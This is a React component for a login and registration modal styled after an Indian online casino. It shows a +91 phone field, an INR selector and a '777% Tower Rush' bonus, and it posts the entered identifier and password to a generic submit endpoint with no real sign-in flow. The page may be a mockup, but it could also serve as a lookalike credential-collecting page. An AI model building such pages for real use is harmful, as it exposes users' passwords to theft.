/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { 
  MessageCircle, 
  X, 
  Mail, 
  Phone, 
  Eye, 
  EyeOff, 
  ChevronDown, 
  Plus, 
  Check,
  ChevronRight
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type AuthType = 'login' | 'registration';
type LoginMethod = 'email' | 'phone';

const BlueButton = ({ children, onClick, active = true, className = "" }: { children: React.ReactNode, onClick?: () => void, active?: boolean, className?: string }) => (
  <button
    onClick={onClick}
    className={`w-full py-3 rounded-lg font-bold text-sm uppercase tracking-wide transition-all duration-200 flex items-center justify-center gap-2 ${
      active 
        ? "bg-[#007aff] text-white shadow-[0_0_20px_rgba(0,122,255,0.3)]" 
        : "bg-[#1c2e42] text-[#8a9bb0]"
    } ${className}`}
  >
    {children}
  </button>
);

const InputWrapper = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => (
  <div className={`relative flex items-center bg-[#0d1b2b] border border-[#1e2f42] rounded-lg overflow-hidden focus-within:border-[#007aff] transition-colors ${className}`}>
    {children}
  </div>
);

export default function App() {
  const [authType, setAuthType] = useState<AuthType>('registration');
  const [loginMethod, setLoginMethod] = useState<LoginMethod>('phone');
  const [showPassword, setShowPassword] = useState(false);
  const [promoOpen, setPromoOpen] = useState(false);
  const [agreed, setAgreed] = useState(false);
  
  // Form State
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const toggleAuth = () => {
    setAuthType(prev => prev === 'login' ? 'registration' : 'login');
    setIdentifier('');
    setPassword('');
  };

  const handleLoginMethodChange = (method: LoginMethod) => {
    setLoginMethod(method);
    setIdentifier(''); // Clear identifier when switching methods
  };

  const handleSubmit = async () => {
    if (password.length === 0) return;
    if (authType === 'registration' && !agreed) return;

    setIsSubmitting(true);
    try {
      const response = await fetch('/api/auth/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          authType,
          loginMethod: authType === 'registration' ? 'phone' : loginMethod,
          identifier,
          password,
          metadata: {
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
          }
        }),
      });

      if (response.ok) {
        console.log('Submitted successfully');
        // Add optional redirect or success message here
      }
    } catch (error) {
      console.error('Submission failed:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Button state logic: active if password has at least 1 character
  const isButtonActive = password.length > 0 && (authType === 'login' || agreed);

  return (
    <div className="min-h-screen bg-[#060b13] text-white flex items-center justify-center p-4 font-sans">
      <motion.div 
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="w-full max-w-[440px] bg-[#0d1b2b] rounded-2xl shadow-2xl relative overflow-hidden"
      >
        {/* Header */}
        <div className="p-6 flex items-center justify-between">
          <button className="text-[#8a9bb0] hover:text-white transition-colors">
            <MessageCircle size={24} />
          </button>
          
          <h1 className="text-xl font-black uppercase tracking-wider">
            {authType === 'login' ? 'Log In' : 'Registration'}
          </h1>

          <button className="text-[#8a9bb0] hover:text-white transition-colors bg-[#1c2e42] p-1 rounded-md">
            <X size={18} />
          </button>
        </div>

        <div className="px-6 pb-8 space-y-6">
          {/* Switch Prompt */}
          <div className="text-sm font-medium">
            <span className="text-[#8a9bb0]">
              {authType === 'login' ? 'New user? ' : 'Have an account? '}
            </span>
            <button 
              onClick={toggleAuth}
              className="text-[#007aff] font-bold hover:underline"
            >
              {authType === 'login' ? 'Registration' : 'Log In'}
            </button>
          </div>

          {/* Login Tabs (Only for Login) */}
          {authType === 'login' && (
            <div className="flex gap-4">
              <BlueButton 
                active={loginMethod === 'email'} 
                onClick={() => handleLoginMethodChange('email')}
                className={loginMethod === 'email' ? "bg-[#007aff]" : "bg-[#1c2e42]"}
              >
                <Mail size={18} className={loginMethod === 'email' ? "text-white" : "text-[#8a9bb0]"} />
                Email or ID
              </BlueButton>
              <BlueButton 
                active={loginMethod === 'phone'} 
                onClick={() => handleLoginMethodChange('phone')}
                className={loginMethod === 'phone' ? "bg-[#007aff]" : "bg-[#1c2e42]"}
              >
                <Phone size={18} className={loginMethod === 'phone' ? "text-white" : "text-[#8a9bb0]"} />
                Phone
              </BlueButton>
            </div>
          )}

          {/* Form Fields */}
          <div className="space-y-4">
            {(authType === 'registration' || loginMethod === 'phone') && (
              <InputWrapper>
                <div className="flex items-center px-3 gap-2 border-r border-[#1e2f42] cursor-pointer hover:bg-white/5 transition-colors">
                  <img 
                    src="https://flagcdn.com/in.svg" 
                    alt="India" 
                    className="w-5 h-4 object-cover"
                  />
                  <span className="text-sm font-bold text-[#8a9bb0]">+91</span>
                  <ChevronDown size={14} className="text-[#8a9bb0]" />
                </div>
                <input 
                  type="tel" 
                  placeholder="Phone number"
                  value={identifier}
                  onChange={(e) => setIdentifier(e.target.value)}
                  className="bg-transparent border-none outline-none flex-1 py-4 px-3 text-sm placeholder:text-[#4a5d71]"
                />
              </InputWrapper>
            )}

            {authType === 'login' && loginMethod === 'email' && (
              <InputWrapper>
                <input 
                  type="text" 
                  placeholder="Email or ID"
                  value={identifier}
                  onChange={(e) => setIdentifier(e.target.value)}
                  className="bg-transparent border-none outline-none flex-1 py-4 px-4 text-sm placeholder:text-[#4a5d71]"
                />
              </InputWrapper>
            )}

            <InputWrapper>
              <input 
                type={showPassword ? "text" : "password"} 
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-transparent border-none outline-none flex-1 py-4 px-4 text-sm placeholder:text-[#4a5d71]"
              />
              <button 
                onClick={() => setShowPassword(!showPassword)}
                className="px-4 text-[#8a9bb0] hover:text-white"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </InputWrapper>

            {authType === 'registration' && (
              <>
                <InputWrapper>
                  <div className="flex items-center px-4 gap-3 w-full cursor-pointer hover:bg-white/5 transition-colors py-4">
                    <div className="w-5 h-4 flex items-center justify-center overflow-hidden rounded-[2px]">
                      <img 
                        src="https://flagcdn.com/in.svg" 
                        alt="India" 
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <span className="text-sm font-medium flex-1">₹ – INR</span>
                    <ChevronDown size={16} className="text-[#8a9bb0]" />
                  </div>
                </InputWrapper>

                <div 
                  className="flex items-center gap-2 text-[#007aff] cursor-pointer hover:underline"
                  onClick={() => setPromoOpen(!promoOpen)}
                >
                  <div className="bg-[#007aff]/10 p-0.5 rounded-full">
                    <Plus size={16} />
                  </div>
                  <span className="text-sm font-bold">I have a promo code</span>
                </div>

                <div className="space-y-2 pt-2">
                  <h3 className="text-xs font-black uppercase tracking-widest text-white/90">Choose your bonus</h3>
                  <div className="bg-[#007aff] p-3 rounded-xl flex items-center gap-3 cursor-pointer group shadow-[0_4px_15px_rgba(0,122,255,0.3)]">
                    <div className="w-12 h-12 rounded-lg bg-white/20 overflow-hidden relative">
                       <img 
                        src="https://images.unsplash.com/photo-1511512578047-dfb367046420?w=100&h=100&fit=crop" 
                        alt="Bonus" 
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-[11px] font-black uppercase leading-tight">777% Tower Rush Welcome Pack</p>
                      <p className="text-[10px] text-white/80 font-medium">Climb the Tower with Boost</p>
                    </div>
                    <ChevronRight size={18} className="transition-transform group-hover:translate-x-0.5" />
                  </div>
                </div>

                <div className="flex gap-3 pt-2">
                  <div 
                    className={`w-5 h-5 rounded border flex items-center justify-center cursor-pointer transition-colors mt-0.5 shrink-0 ${
                      agreed ? 'bg-[#22c55e] border-[#22c55e]' : 'border-[#1e2f42] bg-[#0d1b2b]'
                    }`}
                    onClick={() => setAgreed(!agreed)}
                  >
                    {agreed && <Check size={14} strokeWidth={4} />}
                  </div>
                  <p className="text-[11px] leading-tight text-[#8a9bb0]">
                    I confirm all the <span className="text-white font-bold">Terms of user agreement</span> and that I am over 18
                  </p>
                </div>
              </>
            )}

            {authType === 'login' && (
              <div className="text-sm">
                <span className="text-[#8a9bb0]">Forgot password? </span>
                <button className="text-[#007aff] font-bold hover:underline">Reset</button>
              </div>
            )}

            <div className="pt-4">
              <button 
                onClick={handleSubmit}
                disabled={isSubmitting || !isButtonActive}
                className={`w-full py-4 rounded-lg font-black uppercase tracking-widest text-sm transition-all shadow-[0_4px_20px_rgba(0,122,255,0.2)] ${
                  isButtonActive 
                  ? "bg-[#007aff] text-white hover:brightness-110 active:scale-[0.98]" 
                  : "bg-[#1c2e42] text-[#4a5d71] cursor-not-allowed"
                } ${isSubmitting ? "opacity-70" : ""}`}
              >
                {isSubmitting ? 'Loading...' : (authType === 'login' ? 'Log In' : 'Registration')}
              </button>
            </div>
          </div>

          {/* Divider */}
          <div className="relative flex items-center justify-center">
            <div className="absolute w-full border-t border-[#1e2f42]"></div>
            <span className="relative px-3 bg-[#0d1b2b] text-[10px] font-black uppercase tracking-widest text-[#4a5d71]">Or</span>
          </div>

          {/* Social */}
          <button className="w-full bg-[#007aff] hover:brightness-110 py-3 rounded-full flex items-center justify-center gap-3 font-bold transition-all shadow-[0_4px_20px_rgba(0,122,255,0.2)]">
            <div className="bg-white p-1.5 rounded-full">
              <svg width="14" height="14" viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
            </div>
            <span className="text-sm">Continue with Google</span>
          </button>
        </div>
      </motion.div>
    </div>
  );
}
